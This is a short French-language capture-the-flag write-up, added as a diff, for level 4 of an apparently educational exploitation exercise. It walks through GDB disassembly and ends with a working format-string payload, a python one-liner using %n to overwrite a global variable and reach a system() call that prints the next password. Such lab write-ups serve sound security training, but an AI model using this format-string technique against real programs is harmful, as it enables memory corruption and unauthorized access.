@@ -1,0 +1,25 @@
+GDB level 4 -> info functions :
+0x08048444  p
+0x08048457  n
+0x080484a7  main
+
+Il y'a donc 3 fonctions. On regarde avec disas
+
+On voit que main() appelle la fonction n() et puis quitte le programme. (Voir disas dans ressources\disas)
+on regarde donc disas n : on voit un buffer de 512, mais utilise par fgets encore une fois donc pas d'overflow ici.
+Il y a un appel a p() qui apres verification ne fait qu'un simple appel a printf et revient dns n().
+Il y a ensuite une comparaison entre 0x01025544 (decimal 16930116) et %eax (variable m), une fois la comparaison passe on rentre dans un systen() qui va cat
+le password de level 5!
+
+Le but est donc de changer la variable m pour que la comparaison passe.
+On regarde a quel argument est notre entree avec : AAAA %x %x %x %x %x %x %x %x %x %x %x %x ....
+et on voit que au 12eme argument il y a 41414141 (AAAA), donc on est au 12 eme argument !
+
+Il faut donc construire le payload comme ceci :
+[adresse de m] + [%paddingd] + [%12$n]
+
+On utilise %d pour le padding car le nombre est trop grand, le %d permet a printf d'afficher un entier
+de cette largeur directement, sans qu'on ai a le mettre dans l'entree directement de notre cote.
+
+0x8049810
+python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'
